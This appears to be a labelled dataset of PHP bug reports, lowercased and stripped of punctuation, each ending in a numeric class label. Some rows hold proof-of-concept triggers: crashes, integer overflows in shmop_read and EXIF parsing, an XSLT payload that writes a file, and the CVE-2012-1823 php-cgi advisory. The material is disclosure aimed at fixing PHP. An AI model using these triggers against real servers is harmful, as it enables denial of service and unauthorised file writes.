php hangs on numeric value 2.2250738585072011e-308 if i assign the value 2.2250738585072011e-308 to a variable e.g d 2.2250738585072011e-308 php hangs loops i am using php 5.3.1 xampp 1.7.3 on windows 2.2250738585072011e-308 represents the largest subnormal double-precision floating-point number 0.1111111111111111111111111111111111111111111111111111 x 2^-1022 interestingly nearby decimal literals 2.2250738585072008e-308 2.2250738585072009e-308 2.2250738585072010e-308 and 2.2250738585072012e-308 which all convert to the same floating-point value do not cause this problem test script php d 2.2250738585072011e-308 expected result no hang actual result hang	11
objects unreferenced in get set isset or unset can be freed too early when a set get isset or unset method is called on an object accessed through a reference the refcount can fall to zero causing the object to be destroyed before the mechanism to avoid recursion has finished with the object and memory corruption results these situations are rare but possible and useful more specifically with respect to set consider this php code class myclass private myref public function construct myreferent this myref myreferent public function set property value this myref=null myglobal=new myclass myglobal myglobal mynonexistentproperty triggers set after the object is constructed myglobal and myglobal myref are both references to the same variable and thus both refer to the object when set is called myref and thus myglobal is changed as the method exits this also goes out of scope there are no references remaining to the object so it is destroyed however this happens slightly too soon in the zend engine in zend_std_write_property object is myglobal through which the object is accessed since this is a reference the call to zend_std_call_setter results in object being changed to a null zval and the object being freed but guard is then accessed which was part of the now-freed object the a solution is to separate object so that it is not changed by zend_std_call_setter and we therefore retain a reference to the object which prevents it from being freed until we have finished with the guard it is freed when zval_ptr_dtor is called on object patch attached i have debugged and tested fairly carefully for the set case which was what led me to find the bug the problem exists in this case and is fixed by the patch larger test cases i have which exhibited heap corruption and segfaults or bus errors as side-effects of the bug are also fixed by the patch i have neither confirmed the same problem exists nor that the patch fixes it for the get isset and unset cases but see no reason they would be any different the test suite runs just as well with the patch as without if it helps i found the easiest way to explore this is to set zend_debug_objects to 1 and debug_zend to 2 break on zend_std_call_setter step up a stack frame to zend_std_write_property and print object etc step back down again finish so you will now be back in zend_std_write_property but after the call to zend_std_call_setter has completed you can see the object deallocation on the console and can again examine object etc	11
the iconv_mime_decode_headers function is skipping headers the above mentioned function is skipping all headers below subject ks_c_5601-1987 b uku6odk please see the test script for details test script php headers headers x-account-key account2 x-mozilla-keys received qmail 7033 invoked from network 22 sep 2010 22:36:58 0200 received from mailu.d-server.nl 77.243.232.197 by ns250.d-server.nl with dhe-rsa-aes256-sha encrypted smtp 22 sep 2010 22:36:58 0200 received-spf softfail ns250.d-server.nl transitioning spf record at spf-d.hotmail.com does not designate 77.243.232.197 as permitted sender received from blu0-omc1-s18.blu0.hotmail.com 65.55.116.29 by mailu.d-server.nl with esmtp exim 4.72 envelope-from ly_le41 hotmail.com id 1oyw3v-000314-pm for sales d-hosting.nl wed 22 sep 2010 22:36:45 0200 received from blu143-w18 65.55.116.7 by blu0-omc1-s18.blu0.hotmail.com with microsoft smtpsvc 6.0.3790.4675 wed 22 sep 2010 13:36:30 0700 message-id blu143-w184dce238f5d110e30d2b789600 phx.gbl content-type multipart/alternative boundary 5faabef1-4b2f-4c37-977f-1cac859be8fc x-originating-ip 123.53.127.17 from ly le ly_le41 hotmail.com to rita.van.hooft raabkarcher.nl subject ks_c_5601-1987 b uku6odk date wed 22 sep 2010 22:36:30 0200 importance normal mime-version 1.0 x-originalarrivaltime 22 sep 2010 20:36:30.0206 utc filetime d64b09e0:01cb5a95 x-freemail-from hotmail.com x-ols-boguswarn no x-mailer header x-fake-warning ok 1500 points x-filter-id ebex41zdon1/ws6f8a16scry9n8e9naldag4uenvrxnwlqq8da2euqjnekivweymerwekkg4paqy nyavp7c49meideiu27bnk6mwc6r/fu8k/7rmaqpnz9yd9xziqkq8usi3mwkmeuyjf9gj38d865xi abahneiqhmkglghfntnuldwgeosbmr8libtuwmuk9rodrycwixqqz/wrumiazcg7x+t1tw39ja77 lgppowbmbgblubtcpxj0drd/mr4n8leouadtaqgib7p+zzxcc1hvcf3fm3mnrq59q/suw447kkcb dq4z+d8utko08ipkiypr5tcsk9ga489cmwcks4kyjhdwjzymraljpr/re/nelaj/sexgynpektoc ovzngplhcpvccox989hgb8r+ykl0dkxdswm/rxlamqaqkqp+ryfqjcphtngnfmara/ty x-spamexperts-class unsure x-spamexperts-score 0.46817445882 x-spamexperts-evidence ole 0.50 crm114 0.50 spambayes.hashed 0.92 direct 0.50 spambayes.global_tokens 0.51 pyzor 0.50 sa 0.00 os 0.97 dnsbl 0.50 sender 0.50 x-spamexperts-thermostat x-antivirus avast vps 100922-0 22-09-2010 inbound message x-antivirus-status clean headers headers iconv_mime_decode_headers headers iconv_mime_decode_continue_on_error iso-8859-1 var_dump headers expected result the function should return an associative array containing all headers which are present in raw headers representation actual result array x-account-key string account2 length=8 x-mozilla-keys string length=0 received array 0 string qmail 7033 invoked from network 22 sep 2010 22:36:58 0200 length=61 1 string from mailu.d-server.nl 77.243.232.197 by ns250.d-server.nl with dhe-rsa-aes256-sha encrypted smtp 22 sep 2010 22:36:58 0200 length=129 2 string from blu0-omc1-s18.blu0.hotmail.com 65.55.116.29 by mailu.d-server.nl with esmtp exim 4.72 envelope-from ly_le41 hotmail.com id 1oyw3v-000314-pm for sales d-hosting.nl wed 22 sep 2010 22:36:45 0200 length=210 3 string from blu143-w18 65.55.116.7 by blu0-omc1-s18.blu0.hotmail.com with microsoft smtpsvc 6.0.3790.4675 wed 22 sep 2010 13:36:30 0700 length=136 received-spf string softfail ns250.d-server.nl transitioning spf record at spf-d.hotmail.com does not designate 77.243.232.197 as permitted sender length=129 message-id string blu143-w184dce238f5d110e30d2b789600 phx.gbl length=45 content-type string multipart/alternative boundary 5faabef1-4b2f-4c37-977f-1cac859be8fc length=72 x-originating-ip string 123.53.127.17 length=15 from string ly le ly_le41 hotmail.com length=27 to string rita.van.hooft raabkarcher.nl length=31 subject string ks_c_5601-1987 b uku6odk length=26	11
misbehaviour of magic_quotes_runtime get/set the documentation lists the get_magic_quotes_runtime set_magic_quotes_runtime functions as deprecated as of this php version they still exist and can be called but already work inconsistent when magic_quotes_runtime file_get_contents still escapes data mysqli_fetch_assoc does not anymore test script php set_magic_quotes_runtime 1 echo gmqr var_dump get_magic_quotes_runtime c mysqli_connect mysqli_select_db c test r mysqli_query c select t from test ra mysqli_fetch_assoc r echo ndb test n ra t f file_get_contents test.txt echo n\nfile test.txt n f content of test.txt and table t backslash slash double backslash quotes single quotes expected result expecting similar behaviour from both function calls dependent of the acutal magic_quotes_runtime setting or throwing a fatal or catchable_fatal error that unexpectet results can occur a function thould be completely removed instead of marked as deprecated when it starts to stop working like before actual result deprecated function set_magic_quotes_runtime is deprecated in test.php on line 1 gmqr int 1 db test backslash slash double backslash quotes single quotes file test.txt backslash slash double backslash quotes single quotes	9
ziparchive segfault with fl_unchanged on empty archive from maksymilian arciemowicz poc1 php r nx=new ziparchive nx open dev/null nx locatename a ziparchive fl_unchanged poc2 php r nx=new ziparchive nx open empty.zip nx statname a ziparchive fl_unchanged segfault in zip_name_locate	11
crash on crafted tag php exif 64bit casting vulnerability affected software php 5.3.5 exif extension for 64bit platforms severity low local/remote remote author ikki paradoxengine blog.nibblesec.org summary php exif extension allows developers to work with image metadata within their php code for instance using exif functions it is possible to read metadata from digital camera pictures for further details on this file format please refer to php exif extension for 64bit platforms is affected by a casting vulnerability that occurs during the image header parsing according to our preliminary analysis exploitation of this flaw results in denial of service this vulnerability affects php 5.3.5 and likely all previous versions during our analysis we have successfully tested our poc against php 5.3.2 php 5.3.3 and the latest php release 5.3.5 using the following configuration a system is most likely vulnerable a php 64bit version b php compiled with enable-exif c memory_limit 1 vulnerability details in case of 64bit platforms an improper conversion occurs within php-5.3.5/ext/exif/exif.c at line 1100 php_ifd_get32s and 1118 php_ifd_get32u in detail an image having properly crafted image file directory ifd can be used to trigger a segmentation fault caused by a memory access violation gdb sapi/cli/php gnu gdb 6.8-debian copyright c 2008 free software foundation inc license gplv3 gnu gpl version 3 or later this is free software you are free to change and redistribute it there is no warranty to the extent permitted by law type show copying and show warranty for details this gdb was configured as x86_64-linux-gnu gdb run c etc/php5/cli/php.ini exif.php ihaterepeating2.jpeg starting program archive/stuff/vulnsresearch/php_exif/php-5.3.5/sapi/cli/php c etc/php5/cli/php.ini exif.php ihaterepeating2.jpeg thread debugging using libthread_db enabled start ihaterepeating2.jpeg new thread lwp 10941 program received signal sigsegv segmentation fault switching to thread lwp 10941 in php_ifd_get32s value motorola_intel=0 at archive/stuff/vulnsresearch/php_exif/php-5.3.5/ext/exif/exif.c:1108 1108 return char value 3 24 gdb backtrace 0 in php_ifd_get32s value motorola_intel=0 at archive/stuff/vulnsresearch/php_exif/php-5.3.5/ext/exif/exif.c:1108 1 in php_ifd_get32u value motorola_intel=0 at archive/stuff/vulnsresearch/php_exif/php-5.3.5/ext/exif/exif.c:1120 2 in exif_iif_add_value image_info section_index=13 name undefinedtag tag=517 format=5 length=536870913 value motorola_intel=0 at archive/stuff/vulnsresearch/php_exif/php-5.3.5/ext/exif/exif.c:1760 3 in exif_iif_add_tag image_info section_index=13 name undefinedtag tag=517 format=5 length=536870913 value at archive/stuff/vulnsresearch/php_exif/php-5.3.5/ext/exif/exif.c:1801 4 in exif_process_ifd_tag imageinfo dir_entry 005\002\005 offset_base ii ifdlength=7157 displacement=12 section_index=13 readnextifd=0 tag_table at archive/stuff/vulnsresearch/php_exif/php-5.3.5/ext/exif/exif.c:3115 within the poc image bytes in position 358-35b can be used to craft the value of the components variable int which is later used within memory read operations two cases appear to be interesting case a negative value hexdump c ihaterepeating.jpeg grep i 03 00 00 a0 results in components=-1610612733 case b positive value hexdump c ihaterepeating2.jpeg grep i 01 00 00 20 results in components=536870913 please note that 32dec as mentioned the value of the components variable is later computed in memory operations within another variable named length such value is used in a for-loop instruction line 1745 to read image metadata starting from a memory address although it is possible to control the offset the following instructions line 1671 limit such value to positive integers only cut here if length 0 return cut here consequently it seems possible to oversize the expected value only which results in a memory access violation proof-of-concept two images case a and b have been properly crafted segfault n/a test script php echo start n\n exif_read_data argv 1 echo end n\n	11
race condition when handling many concurrent signals when a user-defined signal handler has been defined and many concurrent signals are being delivered to it through ext/pcntl a race-condition can occur causing memory corruption ext/pcntl handles signals to user-defined functions by placing incoming signals in to a pending signals queue linked-list which is then iterated when pcntl_signal_dispatch is called either explicitly or via a tick however if another signal interrupts the execution of the signal handler whilst it is manipulating this linked list it can become corrupted the correct solution is to block signals from being delivered to the handler whilst it is handling a signal this is achieved using sigprocmask sig_block we have two patches the first just cleans up the allocation of the pending signals queue the second directly addresses the problem by wrapping any block of code that alters the pending signal queue with a set of syscalls to block the handling of any new signals this is the safest approach as blocking the signals will cause the kernel to queue and deliver them once the handler has been unblocked	11
splfileinfo gettype the splfileinfo gettype for symbolic link returns dir which in turn should return link this happens to be in 5.3.2 and occurs on all windows os it correctly returns the type of file referenced which is for dir and file php symlinkdir path/to/symlink symbolic link syminfo new splfileinfo symlinkdir var_dump syminfo gettype expected result string 4 link actual result string 3 dir test script php symlinkdir path/to/symlink symbolic link syminfo new splfileinfo symlinkdir var_dump syminfo gettype expected result string 4 link actual result string 3 dir	9
mt_/rand produce out of range numbers when min 0 and max get_randmax whenever min is set to 0 and max is set to anything greater than getrandmax or the mt version the returned prn is always despite the upper limit check in the example code a number minor than 0 reproduce code define ul mt_getrandmax 1000 r=mt_rand 0 ul if r 0 r ul echo random value out of range\n expected result no output actual result random value out of range	11
integer overflow in shmop_read the problem is in the shmop_read php function in the file ext/shmop/shmop.c this functions reads a given number of bytes from memory at a given offset starting from a shared memory area string shmop_read int shmid int start int count inside the code of the function itself there are checks in the start parameter and in the count parameter to avoid reading arbitrary memory outside the shared memory object if start 0 start shmop size php_error_docref null tsrmls_cc e_warning start is out of range return_false if start count shmop size count 0 php_error_docref null tsrmls_cc e_warning count is out of range return_false the first block check if start is lower than 0 or bigger than the size of the shared memory area the second block checks that the sum addition of start and count is not greater than the shared memory area and later checks if count its not lower than 0 the problem is that both variables are signed longs in 32 bits architectures this means 2^31 maximum value after this value the variable becomes negative so if we put exactly 2^31 as a value in count and 1 as a value in start the first condition start count would become negative 2^31+1 and will pass the check and the second condition count 0 will also pass the check because count its positive 2^31 and do not get negative until the addition of 1 credits jose carlos norte jose at eyeos dot org test script php shm_key ftok file t shm_id shmop_open shm_key c 0644 100 shm_data shmop_read shm_id 1 2147483647 if there is no segmentation fault past this point we have 2gb of memory echo shm_data expected result no sigsegv actual result sigsegv	11
use-after-free in substr_replace caused by passing the same variable multiple times to the function which makes a convert_to type ex call to invalid the each pointer of parameter test script php f array array a a z substr_replace f f f 1 var_dump z f actual result array 1 0 string 5 0dd y array 1 0 string 1 0	11
header can not detect the multi-line header with cr as of php 5.1.2 header can no longer be used to send multiple response headers in a single call to prevent the http response splitting attack header only checks the linefeed lf as line-end marker it does n't check the carriage-return cr however some browsers including google chrome ie also recognize cr as the line end it is reported by mr tokumaru the current specification of header still has the vulnerability against the http header splitting attack test script php header location get url print_r cookie accessed from the url like it should be executed with google chrome or ie expected result warning header may not contain more than a single header new line detected in xxxx/head1.php on line 2 array actual result array name foo	9
php crashes when executing strval when precision setting is very hig the script below crashes while executing strval test script php for i 500 i 1074 i ini_set precision i print i\n strval pow 2 1074 expected result i expect all the integers from 500 to 1074 to be printed each on a separate line actual result this is the actual output of the script on my system 500 501 502 503 504 505 506 507 508 509 510 511 512 513 514 515 516 517 518 519 520 521 522 523 524 525 526 527 segmentation fault	11
integer overflow in sdntojulian cut void sdntojulian long int sdn int pyear int pmonth int pday int year int month int day long int temp int dayofyear if sdn 0 pyear 0 pmonth 0 pday 0 return temp sdn julian_sdn_offset 4 1 cut temp could here be less then 0 due to integer overflow when sdn is large enough test script php for x rand 0 2147483640 echo x\n dummy cal_from_jd x,0 dummy cal_from_jd x,1 expected result sigsegv php core1.php 758413092 1698116908 42935006 988939165 101976420 1332880082 882858043 naruszenie ochrony pami臋ci sigsegv	11
numberformatter setsymbol crash on bogus attr values svn commit r305571 fixed a crash in numberformatter getsymbol when certain invalid values are passed to it as attr argument similar issue affects setsymbol too and does not seem to be addressed in the above above commit underlying icu issue is similar test script numfmt_set_symbol numfmt_create en numberformatter pattern_decimal 2147483648	9
memory leaks when openssl_encrypt called related bug 54060 memory leaks when i call openssl_decrypt test script shows that i ve watch at ext/openssl/openssl.c and according to see example at the bottom you should free cipher_ctx php data jfdslkjvflsdkjvlkfjvlkjfvlkdm,4w 043920r 9234r 32904r 09243 r7-89437 r892374 r894372 r894 7289r7 f frwerfh i iurf iuryw uyrfouiwy ruy 972439 8478942 yrhfjkdhls pass r23498rui324hjbnkj maxi 200000 t microtime 1 for i=0 i maxi i cr openssl_encrypt data i des3 pass false 1qazxsw2 dcr openssl_decrypt cr des3 pass false 1qazxsw2 if dcr data i print at step i decryption failed\n t microtime 1 t print mode openssl_encrypt maxi tests takes t secs maxi t sec n fixes by add this code at line 4818 at the end of openssl_decrypt evp_cipher_ctx_cleanup cipher_ctx	11
memory leaks when openssl_encrypt called memory leaks when i call openssl_encrypt test script shows that i ve watch at ext/openssl/openssl.c and according to see example at the bottom you should free cipher_ctx so i ve put evp_cipher_ctx_cleanup cipher_ctx at line 4722 before retval_stringl base64_str base64_str_len 0 recompile php make make install and after start test mem_non_leaks.log i have decreaced memory leakes it s seems it s not compleate patch with memory leakes valgrind log-file=mem_eak.log leak-check=full php5.3/bin/php d extension=openssl.so crypt_test_openssl.php report 31035 76,713,600 bytes in 199,775 blocks are definitely lost in loss record 128 of 128 31035 at malloc vg_replace_malloc.c:195 31035 by crypto_malloc in lib64/libcrypto.so.0.9.8e 31035 by evp_cipherinit_ex in lib64/libcrypto.so.0.9.8e 31035 by 31035 by zend_do_fcall_common_helper_spec zend_vm_execute.h:316 31035 by zend_do_fcall_spec_const_handler zend_vm_execute.h:1606 31035 by execute zend_vm_execute.h:107 31035 by zend_execute_scripts zend.c:1194 31035 by php_execute_script main.c:2268 31035 by main php_cli.c:1193 31035 31035 leak summary 31035 definitely lost 76,713,984 bytes in 199,776 blocks 31035 indirectly lost 0 bytes in 0 blocks 31035 possibly lost 74,880 bytes in 195 blocks 31035 still reachable 100,809 bytes in 1,688 blocks 31035 suppressed 0 bytes in 0 blocks almost without memory leaks valgrind log-file=mem_non_leaks.log leak-check=full home/dovbyshko/php5.3/bin/php d extension=openssl.so crypt_test_openssl.php 19014 leak summary 19014 definitely lost 384 bytes in 1 blocks 19014 indirectly lost 0 bytes in 0 blocks 19014 possibly lost 0 bytes in 0 blocks 19014 still reachable 88,905 bytes in 1,657 blocks 19014 suppressed 0 bytes in 0 blocks test script php data jfdslkjvflsdkjvlkfjvlkjfvlkdm,4w 043920r 9234r 32904r 09243 r7-89437 r892374 r894372 r894 7289r7 f frwerfh i iurf iuryw uyrfouiwy ruy 972439 8478942 yrhfjkdhls pass r23498rui324hjbnkj maxi 200000 t microtime 1 for i=0 i maxi i openssl_encrypt data i des3 pass false 1qazxsw2 t microtime 1 t print mode openssl_encrypt maxi tests takes t secs maxi t sec n	11
segmentation fault when using ftp proxy hi either the bug 42420 is still alive or it is re-alive but i am not allowed to re-open it so sorry for opening a dup php v says php 5.2.17-pl0-gentoo cli built feb 18 2011 10:01:58 copyright c 1997-2010 the php group zend engine v2.2.0 copyright c 1998-2010 zend technologies with xdebug v2.1.0 copyright c 2002-2010 by derick rethans the php died with segfault on two different machines with two different proxies regards daniel test script php uri ftp pkg-shadow.alioth.debian.org/pub/pkg-shadow/shadow-4.1.4.3.tar.bz2 proxy tcp proxy:8080 opts array ftp array proxy proxy context stream_context_create opts stream_context_set_params context array fh fopen uri r false context while feof fh echo foo\n fread fh 4 1024 fclose fh expected result many foos and no segmentation fault actual result many foos and segementation fault	11
stream_get_contents segfaults on ziparchive streams segmentation fault backtrace gdb bt 0 in strchr from lib64/libc.so.6 1 in php_zip_ops_stat stream value optimized out ssb at root/php-5.3.4/ext/zip/zip_stream.c:111 2 in php_stream_copy_to_mem src buf maxlen=35 persistent=0 at root/php-5.3.4/main/streams/streams.c:1275 3 in zif_stream_get_contents ht value optimized out return_value return_value_ptr value optimized out this_ptr value optimized out return_value_used value optimized out at root/php-5.3.4/ext/standard/streamsfuncs.c:443 4 in suhosin_execute_internal execute_data_ptr return_value_used=1 at root/php-5.3.4/ext/suhosin/execute.c:1673 5 in zend_do_fcall_common_helper_spec execute_data at root/php-5.3.4/zend/zend_vm_execute.h:318 6 in execute op_array at root/php-5.3.4/zend/zend_vm_execute.h:107 7 in suhosin_execute_ex op_array zo=0 dummy=0 at root/php-5.3.4/ext/suhosin/execute.c:585 8 in zend_execute_scripts type=8 retval file_count=3 at root/php-5.3.4/zend/zend.c:1194 9 in php_execute_script primary_file at root/php-5.3.4/main/main.c:2265 10 in main argc=2 argv at root/php-5.3.4/sapi/cli/php_cli.c:1193 test script php target_file meta-inf/manifest.mf za new ziparchive if za open test.jar true return false if za statname target_file false fd za getstream target_file else fd false za close if is_resource fd echo strlen stream_get_contents fd expected result 273 actual result segmentation fault	9
feof never returns true for damaged file in zip opening a damaged zip archive 7z reports crc failed for the faulty file feof never return true the script blocks causing high cpu usage please contact me to get a zip that produces this problem i do n't see how can i attach it here reproduce code o new ziparchive if o open test.zip ziparchive checkcons exit error can\'t open o getstream file2 this file is ok echo ok r o getstream file1 this file has a wrong crc while feof r fread r,1024 echo never here\n expected result the script either reads the file ignoring the crc error or reports the error but finishes actual result the script never ends and uses up the cpu	11
addglob crashes on invalid flags for first function addglob and addpattern are not described in manual ext/zip/php_zip.c 1629 1 glob 2==pcre 1630 if type 1 1631 if zend_parse_parameters zend_num_args tsrmls_cc s|la 1632 pattern pattern_len flags options failure 1633 return 1634 1635 else 1636 if zend_parse_parameters zend_num_args tsrmls_cc s|sa 1637 pattern pattern_len path path_len options failure 1638 return 1639 1640 1641 there are no glob flags validation like in php/glob so limit flags only to glob_mark|glob_nosort|glob_nocheck|glob_noescape|glob_brace|glob_onlydir|glob_err like glob_mark adds a slash to each directory returned glob_nosort return files as they appear in the directory no sorting glob_nocheck return the search pattern if no files matching it were found glob_noescape backslashes do not quote metacharacters glob_brace expands a b c to match a b or c glob_onlydir return only directory entries which match the pattern glob_err stop on read errors like unreadable directories by default errors are ignored test script the crash come when we run libc/glob 3 function with incorrect flag tested also on linux/ubuntu and netbsd cx cx64 php v php 5.3.3-1ubuntu9.3 with suhosin-patch cli built jan 12 2011 16:07:38 copyright c 1997-2009 the php group zend engine v2.3.0 copyright c 1998-2010 zend technologies cx cx64 uname a linux cx64 2.6.35-28-generic 49-ubuntu smp tue mar 1 14:39:03 utc 2011 x86_64 gnu/linux cx cx64 www cat zip.php php unlink empty.zip fopen empty.zip a nx=new ziparchive nx open empty.zip nx addglob str_repeat 333333 cx cx64 www php zip.php segmentation fault actual result segmentation fault	9
crypt returns only the salt for md5 if crypt is executed with md5 salts the return value conists of the salt only des and blowfish salts work as expected i tested with php from opensuse php5 repository php v php 5.3.7rc6-dev cli rpm q php5 php5-5.3.6.201108112132-94.1.x86_64 test script printf md5 s\n crypt password 1 u7ajyb.o expected result md5 1 u7ajyb.o l1n7ux7twamimw0en8uur1 actual result md5 1 u7ajyb.o	4
is_a triggers autoloader when calling is_a with a first argument that is not an object then autoload is triggered test script php function autoload class echo would load class php_eol var test var_dump is_a var b obj new stdclass var_dump is_a obj c expected result bool false bool false actual result would load test bool false bool false	9
integer overflow during the parsing of invalid exif header there is an integer overflow in ext/exif/exif.c that can be used in order to cause a denial of service or read arbitrary memory the bug is only present in 32 bits version the function exif_process_ifd_tag do not correctly check the offset_val value exif.c:2852 value_ptr offset_base+offset_val if offset_val+byte_count ifdlength value_ptr dir_entry the check offset_val byte_count is not safe gdb 2852 value_ptr offset_base+offset_val gdb 2853 if offset_val+byte_count ifdlength value_ptr dir_entry gdb 2905 imageinfo sections_found found_any_tag gdb p/x offset_base 1 gdb p/x offset_val 2 gdb p/x value_ptr 3 gdb p/x offset_val 4 gdb p/x byte_count 5 gdb p/x ifdlength 6 gdb p/x offset_val+byte_count 7 gdb p/x int64_t offset_val+byte_count 8 cflags m32 g cxxflags m32 g configure disable-all enable-exif cflags m32 g cxxflags m32 g make php version php 5.4.0beta1 cli built oct 19 2011 21:15:00 copyright c 1997-2011 the php group zend engine v2.4.0 copyright c 1998-2011 zend technologies test script florent cat run.php php exif exif_read_data argv 1 florent php run.php sample.jpg expected result warning or error without bad pointer dereference actual result gdb r run.php sample.jpg starting program users/florent/downloads/php-5.4.0beta1/sapi/cli/php run.php sample.jpg reading symbols for shared libraries done program received signal exc_bad_access could not access memory reason kern_invalid_address at address in php_strnlen str address out of bounds maxlen=234881127 at exif.c:296 296 if str maxlen str gdb bt 0 in php_strnlen str address out of bounds maxlen=234881127 at exif.c:296 1 in exif_iif_add_value image_info section_index=7 name datetimeoriginal tag=36867 format=2 length=234881127 value motorola_intel=0 at exif.c:1699 2 in exif_iif_add_tag image_info section_index=7 name datetimeoriginal tag=36867 format=2 length=234881127 value at exif.c:1803 3 in exif_process_ifd_tag imageinfo dir_entry 003 002 offset_base ii ifdlength=5510 displacement=12 section_index=7 readnextifd=1 tag_table at exif.c:3110 4 in exif_process_ifd_in_jpeg imageinfo dir_start offset_base ii ifdlength=5510 displacement=12 section_index=7 at exif.c:3138 5 in exif_process_ifd_tag imageinfo dir_entry i 004 offset_base ii ifdlength=5510 displacement=12 section_index=3 readnextifd=1 tag_table at exif.c:3101 6 in exif_process_ifd_in_jpeg imageinfo dir_start f offset_base ii ifdlength=5510 displacement=12 section_index=3 at exif.c:3138 7 in exif_process_tiff_in_jpeg imageinfo charbuf ii length=5510 displacement=12 at exif.c:3215 8 in exif_process_app1 imageinfo charbuf 025 exif length=5518 displacement=4 at exif.c:3240 9 in exif_scan_jpeg_header imageinfo at exif.c:3385 10 in exif_scan_file_header imageinfo at exif.c:3763 11 in exif_read_file imageinfo filename sample.jpg read_thumbnail=0 read_all=0 at exif.c:3902 12 in zif_exif_read_data ht=1 return_value return_value_ptr this_ptr return_value_used=1 at exif.c:3955 13 in zend_do_fcall_common_helper_spec execute_data at zend_vm_execute.h:642 14 in zend_do_fcall_spec_const_handler execute_data at zend_vm_execute.h:2215 15 in execute op_array at zend_vm_execute.h:410 16 in zend_execute_scripts type=8 retval file_count=3 at zend.c:1271 17 in php_execute_script primary_file at main.c:2391 18 in do_cli argc=3 argv at php_cli.c:983 19 in main argc=3 argv at php_cli.c:1356	11
session module is adoptive session module is adoptive so there are chances for session fixation due to adoption cve id cve-2011-4718	8
arbitrary file creation via libxslt output extension current version of php5 allow creation of arbitrary files when processing xslt content this was tested on the following releases php 5.3.2-1ubuntu4.7 with suhosin-patch cli built jan 12 2011 18:36:08 php 5.3.6 cli built apr 1 2011 11:26:17 the problem lies in the unrestricted use of libxslt the attached patch will forbid some operations like the creation of files or directories by calling the libxslt security api test script php sxml xml foo hello from xml foo xml sxsl eot xsl stylesheet version 1.0 xmlns xsl xmlns sax extension-element-prefixes sax xsl template match foo sax output href 0wn3d.php method text xsl value-of select 0wn3d via php and libxslt xsl apply-templates sax output xsl template xsl stylesheet eot load xml file xml new domdocument xml loadxml sxml load xslt file xsl new domdocument xsl loadxml sxsl start xslt xslt new xsltprocessor xslt importstylesheet xsl trasnform print print xslt transformtoxml xml expected result file is n't created and php displays some warnings warning xsltprocessor transformtoxml runtime error file somewhere line 7 element output in somewhere/simple_xslt.php on line 34 warning xsltprocessor transformtoxml file write for 0wn3d.php refused in somewhere/simple_xslt.php on line 34 warning xsltprocessor transformtoxml runtime error file somewhere line 7 element output in somewhere/simple_xslt.php on line 34 warning xsltprocessor transformtoxml xsltdocumentelem write rights for 0wn3d.php denied in somewhere/simple_xslt.php on line 34 actual result file 0wn3d.php is created	2
pdorow to session bug php make a pdo_mysql statement before result stmt fetch pdo fetch_lazy session_start session pdorow result is crashing on next request after saving pdorow to session on session_start	8
strtotime with timezone memory leak strtotime calls with a timezone embedded function correctly but continually use up memory in a daemon program this becomes quickly fatal test script php while true strtotime monday 00:00 europe/paris memory leak php while true date_default_timezone_set europe/paris strtotime monday 00:00 no memory leak expected result memory usage should remain stable	11
insufficient validating of upload name leading to corrupted files indices sapi apache 2 module it should apply to other sapi s which accepts uploads as well os debian 6 it should apply to other oses as well php 5.3.6 from source test compile configure prefix=/tmp/diebug disable-all with-apxs2=/tmp/diebug/bin/apxs disable-cli upload names with brackets and are created for creating arrays of files any array index or variable name containing a bracket should be invalid the current implementation only checks whether more closing brackets are detected than opening brackets related files 990 920 relevant code snip new rule never repair potential malicious user input if skip_upload long c 0 tmp param while tmp if tmp c else if tmp c if tmp 1 tmp 1 skip_upload 1 break if c 0 skip_upload 1 break tmp snip so names like test and test are invalid but names like test pass this test now it gets worse the upload is accepted and without checking the name and registered snip if is_arr_upload snprintf lbuf llen s name s abuf array_index else snprintf lbuf llen s name param if s s filename register_http_post_files_variable lbuf s+1 http_post_files 0 tsrmls_cc else register_http_post_files_variable lbuf filename http_post_files 0 tsrmls_cc snip register_http_post_files_variable calls safe_php_register_variable snip if override_protection is_protected_variable var tsrmls_cc php_register_variable_safe var strval val_len track_vars_array tsrmls_cc snip override_protection is false the only condition that checks whether the variable name is accepted is the is_protected_variable call passing the upload name the variable name is normalized using normalize_protected_variable and then checked for existence in the files array the normalization function normalize_protected_variable checks whether a closing bracket is found and otherwise uses the following string as index snip indexend strchr index indexend indexend indexend 1 index strlen index snip this implies that the index name can contain a opening bracket as well which will be accepted and passed directly to php_register_variable_safe the suggested patch adds a check to ensure that the leftover open brackets is always zero if not it simply drops the upload better safe than sorry test script php if isset post submitted if isset files test if isset files test error echo ok expected result else if isset files test error echo unexpected result else echo ok expected result printf pre s pre htmlspecialchars print_r files true form enctype multipart/form-data method post input type file name test input type submit name submitted form expected result i expected to see ok expected result and an empty array dump because the name is invalid actual result the test script produces unexpected result the upload is accepted but the files array is corrupted array test array name type tmp_name error 4 size 0	9
vu 520827 php-cgi query string parameter vulnerability u 520827 php-cgi query string parameter vulnerability cve cve-2012-1823 keywords php php-cgi overview php-cgi-based setups contain a vulnerability when parsing query string parameters from php files description according to php s website php is a widely-used general-purpose scripting language that is especially suited for web development and can be embedded into html when php is used in a cgi-based setup such as apache s mod_cgid the php-cgi receives a processed query string parameter as command line arguments which allows command-line switches such as s d or c to be passed to the php-cgi binary which can be exploited to disclose source code and obtain arbitrary code execution an example of the s command allowing an attacker to view the source code of index.php is below impact a remote unauthenticated attacker could obtain sensitive information cause a denial of service condition or may be able to execute arbitrary code with the privileges of the web server solution we are currently unaware of a practical solution to this problem references credit thanks to de eindbazen for reporting this vulnerability this document was written by michael orlando	9
vu 520827 php-cgi query string parameter vulnerability u 520827 php-cgi query string parameter vulnerability cve cve-2012-1823 keywords php php-cgi overview php-cgi-based setups contain a vulnerability when parsing query string parameters from php files description according to php s website php is a widely-used general-purpose scripting language that is especially suited for web development and can be embedded into html when php is used in a cgi-based setup such as apache s mod_cgid the php-cgi receives a processed query string parameter as command line arguments which allows command-line switches such as s d or c to be passed to the php-cgi binary which can be exploited to disclose source code and obtain arbitrary code execution an example of the s command allowing an attacker to view the source code of index.php is below impact a remote unauthenticated attacker could obtain sensitive information cause a denial of service condition or may be able to execute arbitrary code with the privileges of the web server solution we are currently unaware of a practical solution to this problem references credit thanks to de eindbazen for reporting this vulnerability this document was written by michael orlando	9
